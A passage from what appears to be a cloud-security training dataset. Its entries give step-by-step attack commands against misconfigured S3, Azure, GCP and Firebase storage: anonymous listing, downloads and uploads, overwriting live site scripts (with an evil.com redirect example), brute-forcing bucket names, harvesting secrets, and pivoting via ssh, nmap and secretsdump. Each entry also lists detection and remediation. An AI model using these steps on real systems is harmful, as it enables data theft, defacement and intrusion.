Alternatively, use the S3Scanner tool (https://github.com/sa7mon/S3Scanner): install it using pip install s3scanner, then run s3scanner buckets.txt (where buckets.txt contains bucket names). 8. Another beginner-friendly method is using a browser. Just type this in the URL bar: http://example-bucket-name.s3.amazonaws.com/. If it shows you a list of files, it’s vulnerable. 9. You can also use Google to find such buckets by using this Google dork: site:s3.amazonaws.com intitle:index.of or site:s3.amazonaws.com confidential. This might list publicly visible buckets with files. 10. If you find a bucket with list access, try to download files using this command: aws s3 cp s3://example-bucket-name/filename.ext . --no-sign-request. Replace with actual bucket and file name. 11. Repeat this for other files. You can download the entire bucket recursively using: aws s3 cp s3://example-bucket-name/ . --recursive --no-sign-request. 12. If you want to view the files graphically, install Cyberduck (https://cyberduck.io/), add a new connection for Amazon S3, and disable authentication. Try connecting to the bucket URL. 13. Once downloaded, check if any files contain sensitive data like API keys, passwords, code, logs, customer data, etc. This is a data leak. 14. Do not upload anything or change content; just demonstrate the impact by showing the listing and file access. 15. Document your findings and report to the organization ethically via bug bounty platforms or contact forms.
- **Detection**: CloudTrail logs, S3 Access Logs, AWS Config rules, Security scanner alerts
- **Solution**: Disable public listing, use AWS S3 Block Public Access settings, set fine-grained IAM permissions, enable logging and monitoring, review all bucket policies, use automation to detect and auto-remediate public buckets
- **Tags**: s3, aws, listbucket, cloud misconfig, beginner cloud hacking, cloud pentest, data exposure

## Unrestricted Download (Public GET Access)

- **Attack Type**: Misconfigured S3 / Blob Storage Attacks
- **Target**: Cloud Storage (S3 / Azure / GCP)
- **Vulnerability**: Misconfigured Object ACL / Blob Permissions
- **MITRE**: T1530 - Data from Cloud Storage Object
- **Impact**: Unauthorized download of sensitive data such as passwords, logs, financial records, personal files, or backups
- **Tools**: Browser, curl, wget, AWS CLI, Google Dork, GitHub Dork, Cyberduck
- **Scenario**: In this scenario, an organization uploads private files such as internal documents, invoices, PII, videos, backups, or code to a cloud storage bucket (like Amazon S3, Azure Blob, or GCP bucket) assuming they are secure. However, due to misconfiguration, the files themselves are accessible publicly even if the bucket itself is not listable. This means anyone with a direct link can download the file, just like clicking on a public download link, without logging in or using any credentials. Attackers can brute-force file names, scan GitHub and search engines for file URLs, or find exposed links in websites or JavaScript files and directly download them.
- **Attack Steps**: 1. Understand that cloud services like Amazon S3, Azure Blob, or Google Cloud Storage let people upload files to the cloud. These files can be made private or public. Sometimes, people mistakenly make the files public without realizing it. This is like putting your personal files on Google Drive and setting them to “Anyone with the link can view.” 2. Your goal is to find such publicly accessible files (GET access) without needing to log in or have any key. 3. Start with Amazon S3. The URLs of public S3 files usually follow the pattern: https://<bucket-name>.s3.amazonaws.com/<filename> or https://s3.amazonaws.com/<bucket-name>/<filename>. 4. You can search for these files using Google Dorking. Go to Google and type: site:s3.amazonaws.com ext:pdf OR ext:xlsx OR ext:docx — this will show publicly downloadable files stored in S3. Try other file extensions like .zip, .bak, .env, .json, .sql, .log, etc. 5. Another method: Go to GitHub.com and use GitHub dorks to find file links accidentally exposed in code. Search: s3.amazonaws.com or .s3. — developers often leave full URLs hardcoded in source code. Open those links to test if they allow direct file download. 6. Visit one of those links. If the file starts downloading or opens in your browser without asking for login, that file has public GET access. 7. If you want to try with a command line, use curl: curl -O https://bucket-name.s3.amazonaws.com/filename.txt — this will download the file if it's public. Or use wget the same way. 8. You can also use Cyberduck (a GUI app for cloud storage). Install Cyberduck from https://cyberduck.io/. Open it, select “Open Connection,” choose Amazon S3, and try entering the URL directly without credentials. If the file is public, you will be able to download it. 9. Some websites store static files like images, resumes, or internal backups on S3, Azure Blob, or GCP. Check the page source (right-click on the page > View Page Source), then search for keywords like .s3., .blob.core.windows.net, or storage.googleapis.com. Copy these links and open them. If they open without a login, they are publicly downloadable. 10. For Azure Blob Storage, URLs typically look like: https://<account>.blob.core.windows.net/<container>/<file>. Try opening these links directly. If the file downloads, it’s public. Use Google search: site:blob.core.windows.net ext:csv OR ext:json. 11. For GCP, use: https://storage.googleapis.com/<bucket>/<filename> — again, try to open this in browser or via curl. 12. If you want to test multiple known buckets or brute-force common filenames (like backup.zip, database.sql, export.csv, etc.), write a simple script or use a tool like S3Scanner. 13. Check the file contents. Is it sensitive? Look for API keys, passwords, employee data, customer PII, confidential logs, etc. These leaks can be serious. 14. DO NOT upload or modify anything. Just verify you can download and confirm the data exposure. Document it with screenshots and a write-up. 15. Report the issue to the organization through their responsible disclosure program, or via bug bounty platforms like HackerOne or Bugcrowd. You may be eligible for a reward for reporting the public file exposure.
- **Detection**: Cloud Access Logs (S3 logs, Azure Monitor, GCP audit logs), Threat detection tools like Amazon Macie or Azure Defender, Monitoring outbound access logs
- **Solution**: Make all file objects private by default, use bucket policies and access control lists (ACLs) to restrict access, enable logging and alerts for public GET requests, implement automated scanners for public files, train developers on cloud security best practices
- **Tags**: aws, s3, azure, blob, unrestricted download, public file, GET misconfig, cloud pentest, data leak

## Public Upload Access (PUT)

- **Attack Type**: Misconfigured S3 / Blob Storage Attacks
- **Target**: Cloud Storage Buckets (S3, Azure Blob, GCP)
- **Vulnerability**: Misconfigured Write/PUT Permissions
- **MITRE**: T1530 - Data from Cloud Storage Object
- **Impact**: Allows attackers to upload malware, phishing content, abuse storage space, damage brand reputation, serve malicious files from legitimate domains
- **Tools**: AWS CLI, curl, Burp Suite (optional), S3Scanner, wget, Cyberduck
- **Scenario**: In this scenario, a cloud storage bucket (such as Amazon S3 or Azure Blob) is misconfigured to allow public write (PUT) access. This means anyone on the internet can upload files to the bucket without authentication. Attackers can exploit this to upload malicious scripts, phishing pages, malware, or fill the bucket with junk to increase the organization’s cloud bill. In some cases, attackers may even host fake login pages using the company's own storage bucket. This attack is especially dangerous when the bucket is linked to a website or public service.
- **Attack Steps**: 1. Understand that Amazon S3 and similar cloud storage services allow users to upload and manage files using a command called PUT. If a bucket is misconfigured with public PUT access, any person with an internet connection can upload files to it, without logging in. 2. Your goal is to find buckets that allow you to upload files using PUT. Start by installing the AWS CLI tool from https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html. Follow the official steps for Windows, macOS, or Linux. 3. Once installed, you don’t need AWS credentials to test public buckets if the --no-sign-request flag is used. This bypasses the need for an AWS account and is used to access public resources. 4. Create a text file called test.txt using Notepad (Windows) or any editor. Write: This is a test upload. and save the file. 5. Use GitHub’s SecLists (https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/s3-buckets.txt) to get potential S3 bucket names. 6. Choose one bucket name and try uploading your file using this command: aws s3 cp test.txt s3://example-bucket-name/test.txt --no-sign-request — Replace example-bucket-name with the actual bucket name. If the upload works with no error, then the bucket has public upload access! 7. You can also test using curl (if you know the file URL path): curl -T test.txt https://example-bucket.s3.amazonaws.com/test.txt — If it uploads successfully, the PUT request worked. 8. To verify the upload, open the file URL in your browser: https://example-bucket.s3.amazonaws.com/test.txt. If it shows your test content, then the bucket is both publicly writable and readable (dangerous!). 9. Use S3Scanner to automate testing: install with pip install s3scanner, create a file buckets.txt with a list of bucket names, then run s3scanner buckets.txt --upload-file test.txt. It will try uploading to each bucket. 10. If successful, now test uploading a different file such as index.html to see if the bucket can be abused to host phishing pages. Write a basic HTML page with the text: “Fake Login Page” and try uploading: aws s3 cp index.html s3://example-bucket-name/index.html --no-sign-request 11. After upload, open the link: https://example-bucket-name.s3.amazonaws.com/index.html. If it shows your HTML page, then the bucket can be used to host malicious content under the organization’s domain. 12. Advanced check: If the bucket is connected to a domain like cdn.example.com, your uploaded file might be visible at https://cdn.example.com/index.html — this makes phishing and defacement even more dangerous. 13. Attackers may also fill the bucket with large junk files (e.g., 100MB zip files) to exhaust storage quotas and increase billing costs. You can try uploading a few dummy files to test this. 14. You can also try uploading .php, .js, or .bat files to see if the server executes them or serves them as downloads. This tests if Remote Code Execution is possible (usually not, but worth checking). 15. If the bucket supports PUT but not GET (write only), you won’t be able to see your uploaded file, but it still uses storage. 16. Cyberduck (https://cyberduck.io/) is a graphical tool you can use to test PUT access visually. Connect to the bucket using “Anonymous login” and try dragging and dropping files into it. 17. Document all successful uploads: take screenshots, note file names, URLs, and the fact that no login was needed. Also test from incognito/private mode to prove no session was involved. 18. Never upload real malware, viruses, or phishing pages in real life. Just use safe dummy files to prove the risk. 19. If confirmed, report the issue ethically to the organization through bug bounty platforms like HackerOne or Bugcrowd, or contact them via a responsible disclosure form.
- **Detection**: Monitor logs for anonymous PUT operations, enable object-level logging, scan for unusual new files or uploads, use CloudTrail (AWS), Azure Monitor, GCP logging
- **Solution**: Disable public write access completely using bucket policies or ACLs, block public access settings in AWS S3, audit all storage containers for permissions, use automated scanners to detect misconfigs, enforce IAM role-based access
- **Tags**: cloud-security, s3, azure, blob, gcp, public-upload, put-abuse, cloud-pentest, beginner-friendly, cloud misconfig

## Overwriting Existing App Files

- **Attack Type**: Misconfigured S3 / Blob Storage Attacks
- **Target**: Static file hosting buckets linked to live websites or apps
- **Vulnerability**: Public PUT access with no overwrite protection
- **MITRE**: T1565.002 - Stored Data Manipulation
- **Impact**: Attackers can deface the website, insert malicious JavaScript, host phishing pages, run XSS/RCE, or cause user compromise and brand damage
- **Tools**: AWS CLI, curl, Burp Suite, Cyberduck, browser (Chrome), Notepad
- **Scenario**: In this scenario, a cloud storage bucket (like Amazon S3 or Azure Blob) is used to host public application files — such as HTML, JavaScript, or CSS — which are directly linked to a website or mobile app. Due to incorrect permissions, an attacker is able to upload (PUT) a file with the same name as an existing legitimate file (e.g., main.js or index.html). This overwrites the original file, leading to defacement, backdooring, phishing, or injecting malicious code into a live application. This can lead to Remote Code Execution (RCE), data theft, session hijacking, or full app compromise.
- **Attack Steps**: 1. Understand that many websites or web apps store their static files — like index.html, main.js, style.css, images, or downloadable content — on cloud buckets like Amazon S3, Azure Blob, or Google Cloud Storage. If these buckets are not properly secured, someone might be able to overwrite these public-facing files. 2. First, visit a target website and right-click > View Page Source. Look for links like https://bucket-name.s3.amazonaws.com/index.html or cdn.example.com/app.js — these indicate the app is using cloud-hosted static files. Note down the full file URL and filename. 3. Open the public URL of a file like main.js or style.css in your browser. If the file opens and you can view or download it without logging in, it is publicly readable — this is the first hint. 4. Next, check if the bucket allows public PUT (upload) access. Create a test file using Notepad and name it exactly the same as the original file (e.g., main.js). Inside it, write a simple text like: alert("Hacked by test user"); and save the file. 5. Install AWS CLI from https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html and complete setup steps. You don’t need AWS credentials if you use the --no-sign-request flag. 6. Try uploading the modified file to the same location using this command: aws s3 cp main.js s3://example-bucket-name/main.js --no-sign-request — replace the bucket name and file with the correct values you found earlier. 7. If the bucket allows overwriting, this command will silently succeed, and your file will replace the original one. There will be no error message. 8. Now go back to the original file URL (like https://example-bucket.s3.amazonaws.com/main.js) and refresh the page. If you see your new content (e.g., JavaScript alert), that means the overwrite was successful. 9. If the JavaScript file is included in a live app or website, users visiting that site may unknowingly execute your injected code — this could be used for stealing cookies, injecting keyloggers, phishing prompts, or redirecting users. 10. To prove the impact (for security research), replace alert("Hacked") with a harmless message like alert("Security Test - Please fix bucket permissions"). NEVER insert real malware or harmful content. 11. Optionally, you can use Burp Suite to intercept and repeat the PUT request to experiment with file headers, content types, or path traversal. Use it only for research purposes. 12. Cyberduck can be used as a visual interface to overwrite files. Install it, open a connection using Amazon S3 (anonymous mode), drag and drop your test file with the same name as the existing file. If upload works, overwrite was successful. 13. If this bucket is linked to a mobile app, you can decompile the APK file using APKTool and check for hardcoded URLs pointing to S3 or Blob endpoints. Then try uploading files with the same name as the app’s resource files. 14. Advanced: If the overwritten file is a script (.js) or HTML (.html) that loads in the browser, you may be able to inject a fake login page or redirect. This simulates a real phishing attack hosted under the target domain. 15. Document all findings: the original file, the overwritten file, timestamps, affected URL, screenshots of before/after, and proof that no login was required. 16. Always report this ethically through responsible disclosure programs, or platforms like HackerOne, Bugcrowd, or direct email to the security team.
- **Detection**: Monitor S3 access logs or Azure/GCP storage logs for PUT operations on existing file paths, detect changes in static content hashes, track anomalies in JS/CSS files via CDN checks
- **Solution**: Lock bucket/object permissions, block public PUT access, use versioning and MFA delete in S3, restrict uploads to backend services only, review all public objects and implement object-level ACLs, scan for script injection
- **Tags**: s3, blob, file-overwrite, defacement, webapp-hack, misconfigured cloud storage, beginner-pentest, upload abuse, cloud-pentest

## Insecure Firebase Storage Rules Exposure

- **Attack Type**: Misconfigured S3 / Blob Storage Attacks
- **Target**: Cloud Storage (Firebase)
- **Vulnerability**: Insecure Public Access to Firebase Storage Rules (allow read, write: if true;)
- **MITRE**: T1190 (Exploit Public-Facing Application)
- **Impact**: Full unauthorized access to sensitive files; attackers can upload malicious content, perform data exfiltration, or disrupt app functionality
- **Tools**: Browser, Firebase tools, Firebase URL scanner (e.g., Google Dorking), Curl/Postman (for testing access), GitHub (for dorking open Firebase links)
- **Scenario**: A developer creates a Firebase project and configures Cloud Storage for app data (like images, videos, or PDFs). However, they leave the storage rules open to public read/write access (allow read, write: if true;), unintentionally allowing attackers to view, upload, or delete sensitive files without authentication.
- **Attack Steps**: 1. Understand the Target: Firebase is used by many Android/web apps. If the developer does not secure the Firebase storage properly, anyone can read/write data without login.2. Look for Firebase Targets: Use Google Dorks to find Firebase URLs. For example, search: site:*.firebaseio.com or inurl:".firebaseio.com/o" in Google to discover public Firebase endpoints. You may also explore GitHub for exposed Firebase links in source code.3. Identify the Firebase Storage Endpoint: Firebase Storage URLs look like this: https://firebasestorage.googleapis.com/v0/b/YOUR-PROJECT-ID.appspot.com/o. You need to find the full URL. Sometimes app traffic (via Burp Suite or browser DevTools) or APK analysis can reveal it.4. Test for Public Access: Open the discovered Firebase Storage URL in your browser. Example: https://firebasestorage.googleapis.com/v0/b/test-project-123.appspot.com/o/sample.pdf?alt=media. If the file opens without login, it means it's publicly accessible.5. Test Directory Listing: Try accessing: https://firebasestorage.googleapis.com/v0/b/test-project-123.appspot.com/o without any file. If you get a JSON listing of all files, public listing is enabled. This is a misconfiguration.6. Check Storage Rules (only possible if you control the Firebase project): Go to Firebase Console > Storage > Rules tab. If you see this rule: allow read, write: if true; — it's insecure. Anyone on the internet can access or modify files.7. Try File Upload (Public Write Test): - Use Curl or Postman to upload a file. - Prepare a sample request using POST method with a test file. - Example curl command: bash<br> curl -X POST -H "Content-Type: image/png" --data-binary @test.png "https://firebasestorage.googleapis.com/v0/b/test-project-123.appspot.com/o?name=upload.png"<br>  - If the upload succeeds and gives you a download URL, then write permissions are also publicly exposed.8. Attempt File Deletion (Dangerous): You can try sending a DELETE request if you suspect delete permissions are also open (do this only on test projects).9. Exfiltrate Data (View Sensitive Files): If you discover files like /users/ids.pdf or /internal/config.json, download them using direct URLs. This confirms data exposure.10. Take Screenshot & Document (if part of an ethical audit): Always document the misconfiguration for reporting to the owner or bug bounty platform.✅ You have now successfully identified and exploited insecure Firebase Storage rules! Do this ethically and only on apps you own or have permission to test.
- **Detection**: Log analysis of file access without auth, alerts on anomalous uploads/downloads
- **Solution**: ✅ Update Firebase Storage rules like:<br>service firebase.storage {<br> match /b/{bucket}/o {<br> match /{allPaths=**} {<br> allow read, write: if request.auth != null;<br> }<br> }<br>}<br>✅ Use Firebase App Check✅ Regularly audit permissions
- **Tags**: firebase, cloud security, misconfiguration, bug bounty, beginner-friendly, public data exposure, gcp

## Bucket Brute-forcing & Enumeration

- **Attack Type**: Misconfigured S3 / Blob Storage Attacks
- **Target**: AWS S3 / GCP Storage / Azure Blob
- **Vulnerability**: Predictable / guessable bucket names with no access controls (no auth)
- **MITRE**: T1580.003 (Cloud Storage Object Discovery)
- **Impact**: Exfiltration of sensitive files, uploading malicious files (e.g. malware), impersonation, ransomware via public buckets
- **Tools**: Google (Dorking), AWS CLI, s3scanner, AWSBucketDump, grayhatwarfare.com, buckets.txt, dnstwist, browser
- **Scenario**: Developers often create cloud storage buckets (on AWS S3, GCP, Azure) to store files, images, backups, or app content. These buckets are sometimes made public without access controls or given predictable names. Attackers can brute-force or guess bucket names, then check for public access. Once found, attackers can view, download, or upload files, leading to data leaks, malware delivery, or full control over bucket content.
- **Attack Steps**: 1. Understand What a Bucket Is: In AWS, a "bucket" is like a public folder in the cloud. Files (called "objects") are stored inside. If someone forgets to lock it, anyone can access it. Buckets are hosted at URLs like: https://bucket-name.s3.amazonaws.com/.2. Start with Bucket Naming Convention: Buckets are often named after the company, app, project, or website. Example: if a company is acmecorp, the bucket might be acmecorp-logs, acmecorp-media, or acmecorp-backups.3. Create a Wordlist: You need a list of potential bucket names to brute-force. You can: - Use existing lists like SecLists (Discovery/S3/buckets.txt) - Generate permutations using dnstwist acmecorp.com --format list - Manually guess names using company names + words like "backup", "prod", "media", "files", "cdn", etc.4. Use Online Bucket Search (No Setup Needed): - Visit https://buckets.grayhatwarfare.com/ - Search for keywords like acme, prod, cdn, etc. - Check if files are downloadable5. Check Access Manually via Browser: - Open URL: https://bucket-name.s3.amazonaws.com/ - If you see an “Access Denied” page → it’s private. - If you see XML output with <ListBucketResult> or downloadable links → it's public!6. Brute-force with s3scanner: - Install with: pip install s3scanner - Prepare a list: bucket-names.txt - Run: s3scanner --bucket-list bucket-names.txt --threads 10 - It will tell you which buckets are accessible (READ / WRITE)7. Alternative Tool: AWSBucketDump: - GitHub: https://github.com/jordanpotti/AWSBucketDump - Clone repo, install requirements. - Run: python AWSBucketDump.py -l bucket-names.txt -m - This will download any files it finds!8. Explore Buckets Manually: - If you find a valid public bucket, try navigating its folders manually: https://bucket-name.s3.amazonaws.com/foldername/filename.txt - Try guessing folder names like /backup/, /db/, /logs/, /admin/, etc.9. Check for Write Permissions (VERY SENSITIVE): - If the bucket is writeable, you can upload a file. - Use AWS CLI: aws s3 cp test.txt s3://bucket-name/ - If the file appears at https://bucket-name.s3.amazonaws.com/test.txt, the bucket allows public writes — this is dangerous.10. Use Google Dorking to Discover Buckets: - Try dorks like: site:s3.amazonaws.com inurl:"/backup" site:s3.amazonaws.com confidential intitle:"index of" s3.amazonaws.com11. Document and Report: If you find an exposed bucket from a third-party organization, do NOT exploit further. Instead, report it via bug bounty platform or the responsible disclosure email.12. Stay Ethical: Only test buckets you own or those meant for public security research. Always avoid uploading malicious content or deleting files.✅ You have now successfully completed S3 bucket enumeration and brute-force. This skill is used in bug bounties, red teaming, and cloud audits. You can adapt the same to Google Cloud Storage and Azure Blob Storage (using similar URLs and tools).
- **Detection**: AWS CloudTrail (for uploads/downloads), Storage scanner logs, alerting on public object listing
- **Solution**: ✅ Enforce private access control lists (ACLs)✅ Disable anonymous listing and write✅ Use random or UUID-based bucket names✅ Enable logging and monitoring✅ Scan using AWS Trusted Advisor or GCP Security Scanner
- **Tags**: cloud, aws, s3, brute-force, misconfiguration, bucket, hacking, grayhat, pentest, beginner

## Finding Secrets/Keys in Exposed Files

- **Attack Type**: Misconfigured S3 / Blob Storage Attacks
- **Target**: AWS S3 / GCP / Azure Blob / GitHub
- **Vulnerability**: Hardcoded secrets, tokens, credentials in public files
- **MITRE**: T1552 (Unsecured Credentials)
- **Impact**: Full compromise of cloud accounts, APIs, databases, servers, user data breach, ransomware
- **Tools**: Browser, AWS CLI, s3scanner, gitrob, TruffleHog, grep, strings, GitHub, Postman, Visual Studio Code
- **Scenario**: Developers often store configuration files, environment files, backups, or logs in cloud storage (like AWS S3, Azure Blob, or GCP buckets). If these files are exposed due to public bucket access, they may contain hardcoded secrets, API keys, JWT tokens, private keys, database credentials, or OAuth tokens. Attackers can search exposed files, scan their contents, and extract secrets to gain access to cloud accounts, databases, internal APIs, or even production servers.
- **Attack Steps**: 1. Understand the Goal: Many developers accidentally upload sensitive files into public cloud buckets (like .env, config.json, credentials.txt, .pem keys, etc.). These files might have passwords, secret tokens, API keys, or access credentials. If the bucket is misconfigured (public), attackers can read them and use the secrets.2. Find Public Buckets or Files: - Visit: https://buckets.grayhatwarfare.com - Search for keywords like env, config, secrets, backup, log, or the company name - Click on file links like config.js, settings.json, backup.tar.gz, or prod.env and download them3. Scan Files for Secrets (Visually): - Open the file in a text editor like VS Code or Notepad++ - Look for keywords: AWS_SECRET_ACCESS_KEY, password=, api_key=, Authorization: Bearer, PRIVATE KEY, DB_USER, JWT_SECRET, etc. - Example: env<br> AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE<br> AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY<br>  - These are valid AWS access credentials. Anyone who finds them can use AWS CLI to control the cloud account.4. Automated Secret Scanning with TruffleHog: - Install TruffleHog (Python): pip install truffleHog - Run on file or folder: bash<br> trufflehog file://./downloaded_files/<br>  - It will automatically detect secrets like API keys, JWTs, Slack tokens, Stripe keys, etc.5. Use strings to Extract Hidden Secrets: - If a file is binary or zipped (like .zip, .tar.gz, .db), use: bash<br> strings filename.tar.gz > output.txt<br>  - Then manually inspect or grep: bash<br> grep -i "key" output.txt<br> grep -i "token" output.txt<br> grep -i "secret" output.txt<br> 6. Use GitHub to Find Linked Secrets: - Many devs upload .env or config files on GitHub by mistake - Use Google dork: site:github.com intext:"AWS_SECRET_ACCESS_KEY" - Or use GitHub's own search - Use gitrob or gitleaks to find secret leaks in open repositories7. Validate the Secrets (Ethical Testing Only): - If you find AWS keys, run (only if authorized): bash<br> aws configure<br> aws s3 ls<br>  - If the keys work, you’ve confirmed unauthorized access - For JWTs, paste them into https://jwt.io to see payloads8. Test API Keys with Postman: - Copy the key or bearer token from the file - Open Postman - Add it to “Authorization” header - Send a request to the exposed API9. Zip/Archive File Inspection: - If the bucket exposes .zip or .tar.gz files, download and extract: bash<br> unzip backup.zip<br> tar -xvzf dump.tar.gz<br>  - Then repeat string search, TruffleHog, and manual inspection10. Avoid Using Found Secrets Unethically: - Do not misuse the keys to destroy, change, or exfiltrate real data - If discovered during bug bounty, report through their platform - Document everything (bucket URL, file name, line of secret, what service it's for)✅ You’ve now successfully completed a real-world secret hunting scenario from public cloud storage. Use this responsibly. This skill is widely used in bug bounty, red teaming, and internal audits.
- **Detection**: Enable credential scanning, alerting, GitHub secret scanning, unusual access patterns
- **Solution**: ✅ Never store secrets in code or buckets✅ Use secret managers (AWS Secrets Manager, Vault)✅ Enable GitHub secret scanning✅ Enable S3 bucket policy to deny public access✅ Rotate keys regularly✅ Audit all files for secrets before upload
- **Tags**: secrets, s3, cloud, misconfiguration, bucket, creds, api_keys, pentesting, bug bounty

## Use Exposed Files to Pivot

- **Attack Type**: Misconfigured S3 / Blob Storage Attacks
- **Target**: Cloud Infrastructure (AWS, GCP, Azure)
- **Vulnerability**: Hardcoded secrets in exposed files used to access other services
- **MITRE**: T1556 (Lateral Movement via Credentials)
- **Impact**: Full takeover of internal apps, APIs, data, servers; used for persistence and deeper access
- **Tools**: Browser, VS Code, TruffleHog, AWS CLI, curl, Postman, ssh, gobuster, dig, nmap, secretsdump.py, s3scanner, JWT.io
- **Scenario**: In cloud environments, developers often upload sensitive files (such as backups, config files, source code, database dumps, or logs) into S3 buckets or blob storage without access control. Attackers who find these exposed files can extract credentials, API tokens, SSH keys, or internal IP addresses. These are then used to "pivot" — move deeper into the internal infrastructure, access internal dashboards, APIs, or cloud instances. This is a common red-team and APT tactic for lateral movement.
- **Attack Steps**: 1. Start with a Misconfigured Bucket: Find a public S3 or blob bucket using tools like s3scanner, grayhatwarfare.com, or Google dorks. Download files that look like config.json, .env, backup.tar.gz, logs.txt, .pem, .sh, or credentials.txt.2. Inspect the File for Secrets: Open the file using a text editor like VS Code. Look for hardcoded secrets such as: - AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY - Database usernames and passwords - JWT tokens (often in logs or config) - SSH private keys (-----BEGIN RSA PRIVATE KEY-----) - Internal API keys (e.g., auth_token=xyz)3. Scan Automatically with TruffleHog or Grep: - Use TruffleHog: trufflehog file://./downloaded_folder - Use grep to search: grep -i "key" config.json, grep -i "pass" logs.txt4. Extract and Analyze Found Credentials: - If AWS keys found, configure using: bash<br> aws configure<br> # enter access key, secret key, region<br> aws s3 ls<br>  - If JWT tokens found, paste into https://jwt.io to view payload and check expiry or roles. - If .pem private key is found, change permission: chmod 400 key.pem and try: bash<br> ssh -i key.pem user@internal.ip.address<br> 5. Pivot to New Target from Found Access: - If credentials give access to AWS S3 → list more buckets: aws s3 ls, download files - If you found DB creds → try using mysql or psql client: bash<br> mysql -h db.internal.local -u admin -p<br>  - If the JWT gives you access to a protected API → use Postman: - Add Authorization: Bearer <JWT> in headers - Access endpoints like /admin/data6. Identify Internal Targets from Files: - If logs mention URLs like http://internal-api:8000/health, note those - If you find .yaml or .ini files with IPs like 10.0.2.15 or hostnames like db1.local, these are internal services7. Enumerate Internal Network (If Access Gained): - Once you access internal servers via SSH (using leaked key), scan nearby machines: bash<br> nmap -sP 10.0.2.0/24<br>  - Try curl or ping on discovered hosts: bash<br> curl http://admin-panel.local:8080<br> 8. Pivot to Higher Privileges: - If .bash_history or .ssh/config is exposed on accessed machines, read them for clues - Search .aws/credentials folder or /etc/nginx/nginx.conf for new secrets - Use secretsdump.py on Windows if you find hashes9. Document Each Pivot Step: - Original bucket name and file - Credential or key found - Access gained (e.g., API, SSH, DB) - Further movement done using that access10. Always Use Ethics and Scope Limits: - Only perform pivots on systems that you have authorization to test - Do not modify, delete, or harm data - These techniques are used in real-world red teaming, pentests, and bug bounties✅ You’ve successfully performed real-world cloud lateral movement by pivoting from an exposed file in public cloud storage to internal resources. This is one of the most impactful types of cloud misconfig exploitation and is often found in real-world breaches.
- **Detection**: CloudTrail logs, server access logs, failed login alerts, anomaly detection
- **Solution**: ✅ Do not store any secrets in public buckets✅ Use centralized secret managers (Vault, AWS Secrets Manager)✅ Use environment variables, not files✅ Implement least privilege IAM roles✅ Rotate keys often and monitor access✅ Run automatic scans for secrets before uploads
- **Tags**: pivoting, cloud, lateral movement, ssh, aws, secrets, jwt, misconfig, real-world, beginner

## Tampering with App Resource Files

- **Attack Type**: Misconfigured S3 / Blob Storage Attacks
- **Target**: Static Web Assets (JS, CSS, HTML, Images)
- **Vulnerability**: Public Cloud Buckets with Write Access to App Resources
- **MITRE**: T1565.001 (Data Manipulation: Transmitted Data)
- **Impact**: Site defacement, malware injection, phishing, user data theft, XSS, full application compromise
- **Tools**: Browser, AWS CLI, Burp Suite, Postman, Inspect Element (Browser DevTools), VS Code, curl, s3scanner
- **Scenario**: Many mobile apps and websites store their images, JavaScript (JS), CSS, fonts, audio, or even HTML files in cloud buckets (S3, Azure, GCP) to make apps load faster via CDNs. If these storage buckets are misconfigured with public write access, attackers can overwrite these resources. By tampering with JS/CSS/images, attackers can inject malware, create phishing attacks, deface the UI, or hijack user sessions. This is extremely dangerous when apps trust files directly from the bucket without verification.
- **Attack Steps**: 1. Understand the Scenario: Apps often store resource files like .js, .css, .json, or images in cloud buckets (e.g., cdn.example.com). If these buckets are misconfigured (public write access), an attacker can upload a malicious or defaced version of the file that users will unknowingly load.2. Find Public Cloud Buckets with Resource Files: - Go to https://buckets.grayhatwarfare.com - Search with keywords like cdn, static, assets, images, or company name - Look for files like main.js, style.css, logo.png, index.html - Note the bucket name, such as example-cdn.s3.amazonaws.com3. Check for Writable Buckets: - Install s3scanner: pip install s3scanner - Create a list: echo example-cdn >> buckets.txt - Run: s3scanner --bucket-list buckets.txt - If result shows [WRITE] → the bucket is writable4. Test Manual Upload (Write Access): - Use AWS CLI or curl: bash<br> curl -X PUT --upload-file tampered.js "https://example-cdn.s3.amazonaws.com/assets/main.js"<br>  - OR with AWS CLI: bash<br> aws s3 cp tampered.js s3://example-cdn/assets/main.js<br>  - If upload succeeds, you’ve tampered the file.5. Create a Tampered Resource File: - Open main.js or any existing file - Add a harmless payload for test (e.g., alert box): javascript<br> alert("This site has been tampered.");<br>  - Save it and name it main.js or same as the original6. Upload Tampered File to Bucket: - Use same upload command to replace the original file - Example: bash<br> aws s3 cp main.js s3://example-cdn/assets/main.js<br>  - Or: bash<br> curl -X PUT --upload-file main.js "https://example-cdn.s3.amazonaws.com/assets/main.js"<br> 7. Confirm the Attack is Live: - Open the original app or website that uses the JS file - Press F12 to open DevTools → Network Tab - Reload the page and check if it loads the tampered JS from the same bucket URL - If the alert appears or content changes visually → success! You’ve tampered with live content8. Other Real Attack Examples (DO NOT DO MALICIOUSLY): - Inject a redirect in JS: window.location="https://evil.com" - Modify style.css to deface app layout - Add XSS payloads in HTML or JS - Replace company logo with a fake or inappropriate image - Add keyloggers or session hijacking scripts9. Detect and Document the Misconfiguration: - Note the URL of the bucket and overwritten file - Screenshot the app loading the tampered resource - Document steps used (bucket name, method of upload, resource path)10. Report Ethically (If Bug Bounty or Testing): - Do not leave malicious content live - Immediately delete the uploaded file - Report via HackerOne / Bugcrowd / security email✅ Congratulations — You’ve just learned how attackers can use public-write misconfigurations in S3/Blob/CDN buckets to tamper with web/mobile application files. This is a real-world exploitation method used in web defacement, malware delivery, phishing attacks, and brand reputation damage.
- **Detection**: Website behavior anomaly, file integrity check, browser alerting tools, CDN monitoring
- **Solution**: ✅ Enforce S3 bucket policies to disable public write✅ Use signed URLs and origin restrictions✅ Implement Content Security Policy (CSP)✅ Use Subresource Integrity (SRI) to verify files✅ Audit all buckets and enable logging✅ Regularly scan for tampering with automated tools
- **Tags**: s3, tampering, xss, cloud, misconfigured bucket, defacement, resource injection, cdn, beginner, hacking

## Firebase API Key & Database URL (from google-services.json)

- **Attack Type**: Exposed API Keys / Secrets in Repos
- **Target**: Firebase (Google Cloud), Realtime DB
- **Vulnerability**: Exposed mobile app config with public Firebase access
- **MITRE**: T1552.001 (Credentials in Files)
- **Impact**: Full read/write to database, fake user creation, spam injection, data leak, account hijack
- **Tools**: Browser, GitHub, Firebase Scanner (open-source), curl, Postman, Burp Suite, VS Code, Firebase Realtime DB GUI
